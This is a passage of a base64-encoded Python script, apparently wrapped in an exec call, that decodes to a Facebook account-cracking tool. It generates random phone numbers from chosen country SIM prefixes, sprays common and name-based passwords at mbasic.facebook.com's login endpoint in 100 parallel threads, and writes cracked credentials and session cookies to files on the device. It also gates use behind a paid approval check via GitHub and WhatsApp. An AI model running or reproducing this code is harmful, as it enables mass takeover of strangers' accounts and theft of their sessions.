UwgSURTOiB7eHJ9Jyt0bCkNCiAgICAgICAgc25pZ2Rob19IYXNhbihmJ3t4fVt7eHJ9Xnt4fV1cMDMzWzA7OTJtIFBMRUFTRSBXQUlUIFBST0NFU1MgSEFTIEJFRU4gU1RBUlRFRCcpDQogICAgICAgIHNuaWdkaG9fSGFzYW4oZid7eH1be3hyfV57eH1dXDAzM1swOzkybSBZT1UgSU5QVSBOQU1FIDonK2Zhc3RuYW1lK2xhc3R0bmFtZSkNCiAgICAgICAgc25pZ2Rob19IYXNhbihmJ1wwMzNbMDs5N21be3hyfV57eH1dIFx4MWJbMzg7NTsyMDhtVXNlIEZsaWdodCBNb2RlIEZvciBTcGVlZCBVcCcpDQogICAgICAgIHNuaWdkaG9fSGFzYW4oZidcMDMzWzA7OTdtW3t4cn1ee3h9XSBcMDMzWzA7OTVtU2xvdyBDbG9uaW5nJykNCiAgICAgICAgc25pZ2Rob19IYXNhbignXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgICAgICBmb3IgbG92ZSBpbiB1c2VyOg0KICAgICAgICAgICAgc25pZ2Rob3VzZXI9ZmFzdG5hbWUrY29kZStsYXN0dG5hbWUrbG92ZQ0KICAgICAgICAgICAgcHd4ID0gW2Zhc3RuYW1lK2xhc3R0bmFtZSxmYXN0bmFtZStsYXN0dG5hbWUrbG92ZSxmYXN0bmFtZStsb3ZlLGxhc3R0bmFtZStsb3ZlLCdiYW5nbGFkZXNoJywnaSBsb3ZlIHlvdScsJ2ZyZWUgZmlyZScsZmFzdG5hbWUrJzEyMycsbGFzdHRuYW1lKycxMjMnXQ0KICAgICAgICAgICAgdWlkID0gc25pZ2Rob3VzZXIrJ0BnbWFpbC5jb20nDQogICAgICAgICAgICBmb3IgRW1hbiBpbiBIYW1paUlEOg0KICAgICAgICAgICAgICAgIHB3eC5hcHBlbmQoRW1hbikNCiAgICAgICAgICAgICAgICBwd3guYXBwZW5kKGxvdmUpDQogICAgICAgICAgICBtYW5zaGVyYS5zdWJtaXQocmNyYWNrLHVpZCxwd3gsdGwpDQogICAgcHJpbnQoZiJcbnt4fSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKQ0KDQojUkFORE9NIEJEICAgICANCmRlZiBzbmlnZGhvX2JkKCk6DQogICAgdXNlcj1bXQ0KICAgIHR3ZiA9W10NCiAgICBvcy5nZXR1aWQNCiAgICBvcy5nZXRldWlkDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgc25pZ2Rob19IYXNhbihsb2dvKQ0KICAgIHNuaWdkaG9fSGFzYW4oZicgW3t4cn1ee3h9XSBFeGFtcGxlPjoge3hyfTAxOSwwMTcsMDE4LDAxNiwwMTV7eH0nKQ0KICAgIHNuaWdkaG9fSGFzYW4oIiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpDQogICAgcmsxID0gJzAxJw0KICAgIGNvZGUgPSByYW5kb20uY2hvaWNlKFtyazFdKSAgICAgICAgICAgICAgICAgICAgICAjIGlucHV0KGYnIFt7eHJ94page3h9XSBDaG9vc2UgOiAnKQ0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIHNuaWdkaG9fSGFzYW4obG9nbykNCiAgICBsaW1pdCA9IGludChpbnB1dChmJ1wwMzNbMDs5N21be3hyfV57eH1dXDAzM1swOzkybSBFWEFNUExFIDogXDAzM1swOzkzbTEwMDAwLCBceDFiWzM4OzU7MjA4bTIwMDAwLCBcMDMzWzA7OTJtNTAwMDAgXSBcblwwMzNbMDs5NW0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSBcblwwMzNbMDs5N21be3hyfV57eH1dIFwwMzNbMDs5Mm1QVVQgQ0xPTklORyBMSU1JVDpcMDMzWzA7OTNtICcpKQ0KICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDkpKQ0KICAgICAgICB1c2VyLmFwcGVuZChubXApDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgc25pZ2Rob19IYXNhbihsb2dvKQ0KICAgIHBhc3N4ID0gMA0KICAgIEhhbWlpSUQgPSBbXQ0KICAgIHNuaWdkaG9fSGFzYW4oIiIpDQogICAgZm9yIGJpbGFsIGluIHJhbmdlKHBhc3N4KToNCiAgICAgICAgcHd3ID0gaW5wdXQoZiJbKl0gRW50ZXIgUGFzc3dvcmQge2JpbGFsKzF9IDogIikNCiAgICAgICAgSGFtaWlJRC5hcHBlbmQocHd3KQ0KICAgIHdpdGggVGhyZWFkUG9vbChtYXhfd29ya2Vycz0xMDApIGFzIG1hbnNoZXJhOg0KICAgICAgICBjbGVhcigpDQogICAgICAgIHRsID0gc3RyKGxlbih1c2VyKSkNCiAgICAgICAgc25pZ2Rob19IYXNhbignXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgICAgICBzbmlnZGhvX0hhc2FuKGYnW3t4cn1ee3h9XVx4MWJbMzg7NTsyMDhtIFlPVVIgVE9UQUwgSURTOiB7eHJ9Jyt0bCkNCiAgICAgICAgc25pZ2Rob19IYXNhbihmJ3t4fVt7eHJ9Xnt4fV1cMDMzWzA7OTJtIFBMRUFTRSBXQUlUIFlPVVIgQ0xPTklORyBQUk9DRVNTIEhBUyBCRUVOIFNUQVJURUQnKQ0KICAgICAgICBzbmlnZGhvX0hhc2FuKGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV1cMDMzWzA7OTNtIFVTRSBZT1VSIE1PQklMRSBEQVRBICcpDQogICAgICAgIHNuaWdkaG9fSGFzYW4oZidcMDMzWzA7OTdtW3t4cn1ee3h9XSBceDFiWzM4OzU7MjA4bVVzZSBGbGlnaHQgTW9kZSBGb3IgU3BlZWQgVXAnKQ0KICAgICAgICBzbmlnZGhvX0hhc2FuKGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV0gXDAzM1swOzk1bVN1cGVyIEZhc3QgU3BlZWQgQ2xvbmluZycpDQogICAgICAgIHNuaWdkaG9fSGFzYW4oJ1wwMzNbMTs5N209PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykNCiAgICAgICAgZm9yIGxvdmUgaW4gdXNlcjoNCiAgICAgICAgICAgIHB3eCA9IFtsb3ZlWzM6XSxjb2RlK2xvdmUsbG92ZVsxOl0sJ0JhbmdsYWRlc2gnLCdnYW1lK2NvZGUnLCdpIGxvdmUgeW91JywnZnJlZSBmaXJlJywnZnJlZWZpcmUnXQ0KICAgICAgICAgICAgdWlkID0gY29kZStsb3ZlDQogICAgICAgICAgICBmb3Igc25pZ2RobyBpbiBIYW1paUlEOg0KICAgICAgICAgICAgICAgIHB3eC5hcHBlbmQoc25pZ2RobykNCiAgICAgICAgICAgICAgICBwd3guYXBwZW5kKGxvdmUpDQogICAgICAgICAgICBtYW5zaGVyYS5zdWJtaXQocmNyYWNrLHVpZCxwd3gsdGwpDQogICAgcHJpbnQoZiJcbnt4fSAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpDQoNCg0KI19fX19fX18NCmRlZiBzbmlnZGhvX3BrKCk6DQogICAgdXNlcj1bXQ0KICAgIHR3ZiA9W10NCiAgICBvcy5nZXR1aWQNCiAgICBvcy5nZXRldWlkDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgc25pZ2Rob19IYXNhbihsb2dvKQ0KICAgIHNuaWdkaG9fSGFzYW4oZicgW3t4cn1ee3h9XSBFeGFtcGxlPjoge3hyfTkyMzE4LDkyMzQ1LDkyMzIzLDkyMzA2LkVUQ3t4fScpDQogICAgc25pZ2Rob19IYXNhbigiIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iKQ0KDQogICAgY29kZSA9IGlucHV0KGYnIFt7eHJ94page3h9XSBQVVQgWU9VUiBTSU0gQ09ERSA6ICcpDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgc25pZ2Rob19IYXNhbihsb2dvKQ0KICAgIGxpbWl0ID0gaW50KGlucHV0KGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV1cMDMzWzA7OTJtIEVYQU1QTEUgOiBcMDMzWzA7OTNtMTAwMDAsIFx4MWJbMzg7NTsyMDhtMjAwMDAsIFwwMzNbMDs5Mm01MDAwMCBdIFxuXDAzM1swOzk1beKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCBcblwwMzNbMDs5N21be3hyfV57eH1dIFwwMzNbMDs5Mm1QVVQgQ0xPTklORyBMSU1JVDpcMDMzWzA7OTNtICcpKQ0KICAgIGZvciBubWJyIGluIHJhbmdlKGxpbWl0KToNCiAgICAgICAgbm1wID0gJycuam9pbihyYW5kb20uY2hvaWNlKHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDcpKQ0KICAgICAgICB1c2VyLmFwcGVuZChubXApDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgc25pZ2Rob19IYXNhbihsb2dvKQ0KICAgIHBhc3N4ID0gMA0KICAgIEhhbWlpSUQgPSBbXQ0KICAgIHNuaWdkaG9fSGFzYW4oIiIpDQogICAgZm9yIGJpbGFsIGluIHJhbmdlKHBhc3N4KToNCiAgICAgICAgcHd3ID0gaW5wdXQoZiJbKl0gRW50ZXIgUGFzc3dvcmQge2JpbGFsKzF9IDogIikNCiAgICAgICAgSGFtaWlJRC5hcHBlbmQocHd3KQ0KICAgIHdpdGggVGhyZWFkUG9vbChtYXhfd29ya2Vycz0xMDApIGFzIG1hbnNoZXJhOg0KICAgICAgICBjbGVhcigpDQogICAgICAgIHRsID0gc3RyKGxlbih1c2VyKSkNCiAgICAgICAgc25pZ2Rob19IYXNhbignXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgICAgICBzbmlnZGhvX0hhc2FuKGYnW3t4cn1ee3h9XVx4MWJbMzg7NTsyMDhtIFlPVVIgVE9UQUwgSURTOiB7eHJ9Jyt0bCkNCiAgICAgICAgc25pZ2Rob19IYXNhbihmJ3t4fVt7eHJ9Xnt4fV1cMDMzWzA7OTJtIFBMRUFTRSBXQUlUIFlPVVIgQ0xPTklORyBQUk9DRVNTIEhBUyBCRUVOIFNUQVJURUQnKQ0KICAgICAgICBzbmlnZGhvX0hhc2FuKGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV1cMDMzWzA7OTNtIFVTRSBZT1VSIE1PQklMRSBEQVRBICcpDQogICAgICAgIHNuaWdkaG9fSGFzYW4oZidcMDMzWzA7OTdtW3t4cn1ee3h9XSBceDFiWzM4OzU7MjA4bVVzZSBGbGlnaHQgTW9kZSBGb3IgU3BlZWQgVXAnKQ0KICAgICAgICBzbmlnZGhvX0hhc2FuKGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV0gXDAzM1swOzk1bVN1cGVyIEZhc3QgU3BlZWQgQ2xvbmluZycpDQogICAgICAgIHNuaWdkaG9fSGFzYW4oJ1wwMzNbMTs5N209PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09JykNCiAgICAgICAgZm9yIGxvdmUgaW4gdXNlcjoNCiAgICAgICAgICAgIHB3eCA9IFtsb3ZlWzM6XSxjb2RlK2xvdmUsbG92ZVsxOl0sJ2toYW5raGFuJywna2hhbjExMjInLCdraGFuMTInLCdraGFuMTIzJywna2hhbjEyMzQ1NicsJ2kgbG92ZSB5b3UnLCdmcmVlIGZpcmUnLCdwYWtpc3RhbiddDQogICAgICAgICAgICB1aWQgPSBjb2RlK2xvdmUNCiAgICAgICAgICAgIGZvciBzbmlnZGhvIGluIEhhbWlpSUQ6DQogICAgICAgICAgICAgICAgcHd4LmFwcGVuZChzbmlnZGhvKQ0KICAgICAgICAgICAgICAgIHB3eC5hcHBlbmQobG92ZSkNCiAgICAgICAgICAgIG1hbnNoZXJhLnN1Ym1pdChyY3JhY2ssdWlkLHB3eCx0bCkNCiAgICBwcmludChmIlxue3h9ID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKQ0KDQoNCg0KZGVmIHJjcmFjayh1aWQscHd4LHRsKToNCiAgICAjcHJpbnQodXNlcikNCiAgICBnbG9iYWwgbG9vcA0KICAgIGdsb2JhbCBjcHMNCiAgICBnbG9iYWwgb2tzDQogICAgZ2xvYmFsIHByb3h5DQogICAgdHJ5Og0KICAgICAgICBmb3IgcHMgaW4gcHd4Og0KICAgICAgICAgICAgcHJvID0gcmFuZG9tLmNob2ljZSh1Z2VuKQ0KICAgICAgICAgICAgcHJvID0gcmFuZG9tLmNob2ljZSh1Z2VuMikNCiAgICAgICAgICAgIHNlc3Npb24gPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIGZyZWVfZmIgPSBzZXNzaW9uLmdldCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tJykudGV4dA0KICAgICAgICAgICAgbG9nX2RhdGEgPSB7DQogICAgICAgICAgICAgICAgImxzZCI6cmUuc2VhcmNoKCduYW1lPSJsc2QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgImphem9lc3QiOnJlLnNlYXJjaCgnbmFtZT0iamF6b2VzdCIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAibV90cyI6cmUuc2VhcmNoKCduYW1lPSJtX3RzIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJsaSI6cmUuc2VhcmNoKCduYW1lPSJsaSIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAidHJ5X251bWJlciI6IjAiLA0KICAgICAgICAgICAgInVucmVjb2duaXplZF90cmllcyI6IjAiLA0KICAgICAgICAgICAgImVtYWlsIjp1aWQsDQogICAgICAgICAgICAicGFzcyI6cHMsDQogICAgICAgICAgICAibG9naW4iOiJMb2cgSW4ifQ0KICAgICAgICAgICAgaGVhZGVyX2ZyZWVmYiA9IHsiYXV0aG9yaXR5IjogJ21iYXNpYy5mYWNlYm9vay5jb20nLA0KICAgICAgICAgICAgIm1ldGhvZCI6ICdHRVQnLA0KICAgICAnYWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNycsDQogICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCcsDQogICAgJ2NhY2hlLWNvbnRyb2wnOiAnbWF4LWFnZT0wJywNCiAgICAnZHByJzogJzIuNzUnLA0KICAgICdyZWZlcmVyJzogJ2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20vJywNCiAgICAnc2VjLWNoLXByZWZlcnMtY29sb3Itc2NoZW1lJzogJ2RhcmsnLA0KICAgICdzZWMtY2gtdWEnOiAnIihOb3QoQTpCcmFuZCI7dj0iOTkiJywNCiAgICAnc2VjLWNoLXVhLWZ1bGwtdmVyc2lvbi1saXN0JzogJyIoTm90KEE6QnJhbmQiO3Y9Ijk5LjAuMC4wIicsDQogICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzAnLA0KICAgICdzZWMtY2gtdWEtbW9kZWwnOiAnIjIyMDExMTdURyInLA0KICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIm1hY09TIicsDQogICAgJ3NlYy1jaC11YS1wbGF0Zm9ybS12ZXJzaW9uJzogJyIiJywNCiAgICAnc2VjLWZldGNoLWRlc3QnOiAnZG9jdW1lbnQnLA0KICAgICdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsDQogICAgJ3NlYy1mZXRjaC1zaXRlJzogJ2Nyb3NzLXNpdGUnLA0KICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsDQogICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsDQogICAgJ3VzZXItYWdlbnQnOiBwcm8sDQogICAgJ3ZpZXdwb3J0LXdpZHRoJzogJzk4MCcsfQ0KICAgICAgICAgICAgbG8gPSBzZXNzaW9uLnBvc3QoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvbG9naW4vYXN5bmMvP3JlZnNyYz1kZXByZWNhdGVkJmx3dj0xMDAnLGRhdGE9bG9nX2RhdGEsaGVhZGVycz1oZWFkZXJfZnJlZWZiKS50ZXh0DQogICAgICAgICAgICBsb2dfY29va2llcz1zZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkNCiAgICAgICAgICAgIGlmICdjX3VzZXInIGluIGxvZ19jb29raWVzOg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzc6MjJdDQogICAgICAgICAgICAgICAgcHJpbnQoJ1xyXHJcMDMzWzE7MzJtW1JPT1RFRC1PSxpdIFwwMzNbMDs5N20nK3VpZCsnXDAzM1sxOzMybRogfCBcMDMzWzA7OTNtJyArcHMrICAgICcgIFxuWxpdXDAzM1swOzkzbSBDT09LSUUgPSBcMDMzWzE7MzJtJytjb2tpKyAgJyAgJycgIFwwMzNbMDs5N20nKQ0KICAgICAgICAgICAgICAgIGNla19hcGsoc2Vzc2lvbixjb2tpKQ0KICAgICAgICAgICAgICAgIHNuNGdkaDkoJy9zZGNhcmQvQkhULU9LLnR4dCcsICdhJykud3JpdGUoIHVpZCsnIHwgJytwcysnXG4nKQ0KICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBsb2dfY29va2llczoNCiAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgY2lkID0gY29raVsyNDozOV0NCiAgICAgICAgICAgICAgICBwcmludCgnXHJcclwzM1sxOzMwbVtST09URUQtQ1BdICcgK3VpZCsgJyB8ICcgK3BzKyAgICAgICAgICAgJyAgXDMzWzA7OTdtJykNCiAgICAgICAgICAgICAgICBzbjRnZGg5KCcvc2RjYXJkL0JIVC1DUC50eHQnLCAnYScpLndyaXRlKCB1aWQrJyB8ICcrcHMrJyBcbicpDQogICAgICAgICAgICAgICAgY3BzLmFwcGVuZCh1aWQpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgbG9vcCs9MQ0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGYnXHJcciVze3h9W3t4cn1ST09URUR7eH1dWyVzfCVzXVtPSzp7eHJ9JXN7eH1dJyUoSCxsb29wLHRsLGxlbihva3MpKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KDQoNCmRlZiByZWcoKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludChsb2dvKQ0KICAgIHByaW50ICgnJykNCiAgICBwcmludCAoJ1x4MWJbMTszMTsxbVdBVEUgRk9SIExPR0lORyBBUFJPVkFMJykNCiAgICBwcmludCAoJycpDQogICAgdGltZS5zbGVlcCgxKQ0KICAgIHRyeToNCiAgICAgICAgdG8gPSBvcGVuKCcvc2RjYXJkLy5tYS50eHQnLCAncicpLnJlYWQoKQ0KICAgIGV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KICAgICAgICByZWcyKCkNCg0KICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TaHV2by1CQkhIL3NuaWdkaG8tbWV4L21haW4vYXByb3ZhbC50ZXh0JykudGV4dA0KICAgIGlmIHRvIGluIHI6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBwcmludCgnV0VMTCBDT01FIFRPIFBBSUQgTUFOVScpDQogICAgICAgIHRpbWUuc2xlZXAoNSkNCiAgICAgICAgKCkNCiAgICBlbHNlOg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykgICAgIA0KICAgICAgICBwcmludCAoJ1x0QXBwcm92ZWQgRmFpbGVkJykNCiAgICAgICAgcHJpbnQgKCcgXHgxYlsxOzkybVlvdXIgSWQgSXMgTm90IEFwcHJvdmVkICcpDQogICAgICAgIHByaW50ICgnIFx4MWJbMTs5Mm1Db3B5IHRoZSBpZCBhbmQgc2VuZCB0byBBZG1pbicpDQogICAgICAgIHByaW50ICgnIFx4MWJbMTs5Mm1Zb3VyIGlkIDogJyArIHRvKQ0KICAgICAgICBpbnB1dCgnXHgxYlsxOzkzbSBQcmVzcyBlbnRlciB0byBzZW5kIGlkJykNCiAgICAgICAgb3Muc3lzdGVtKCdhbSBzdGFydCBodHRwczovL3dhLm1lLys4ODAxNzQ3OTUxMTY5P3RleHQ9QXNzYWxhbW93YWxpa29tJTIwU2lyLCUyMEklMjBXYW50JTIwVG8lMjBCdXklMjBZb3VyJTIwc25pZ2RobyUyMFBhaWQlMjBUb29scy4lMjBNeSUyMEtleTolMjAnK2lkK3NuaWdkaG8pDQogICAgICAgIHJlZygpDQoNCg0KZGVmIHJlZzIoKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludChsb2dvKQ0KICAgIHNuaWdkaG89Jz1iaHQ9TUVYPScNCiAgICBwcmludCAoJ1x0QXBwcm92YWwgbm90IGRldGVjdGVkJykNCiAgICBwcmludCAoJyBceDFiWzE7OTJtQ29weSBhbmQgcHJlc3MgZW50ZXIgLCcpDQogICAgaWQgPSB1dWlkLnV1aWQ0KCkuaGV4WzoxMF0NCiAgICBwcmludCAoJyBZb3VyIGlkOiAnICsgaWQrc25pZ2RobykNCiAgICBwcmludCAoJycpDQogICAgaW5wdXQoJyBQcmVzcyBlbnRlciB0byBnbyB0byB3aGF0c2FwcCAnKQ0KICAgIG9zLnN5c3RlbSgnYW0gc3RhcnQgaHR0cHM6Ly93YS5tZS8rODgwMTc0Nzk1MTE2OT90ZXh0PUFzc2FsYW1vd2FsaWtvbSUyMFNpciwlMjBJJTIwV2FudCUyMFRvJTIwQnV5JTIwWW91ciUyMHNuaWdkaG89TUVYJTIwUGFpZCUyMFRvb2xzLiUyME15JTIwS2V5OiUyMCcraWQrc25pZ2RobykNCiAgICBzYXYgPSBvcGVuKCcvc2RjYXJkLy5tYS50eHQnLCAndycpDQogICAgc2F2LndyaXRlKGlkK3NuaWdkaG8pDQogICAgc2F2LmNsb3NlKCkNCiAgICBpbnB1dCgnXHgxYlsxOzkybSBQcmVzcyBlbnRlciB0byBjaGVjayBBcHByb3ZhbCAnKQ0KICAgIHJlZygpDQoNCmlmIF9fbmFtZV9fPT0nX19tYWluX18nOg0KICAgIHNuaWdkaG8oKQ0KDQoNCg=="))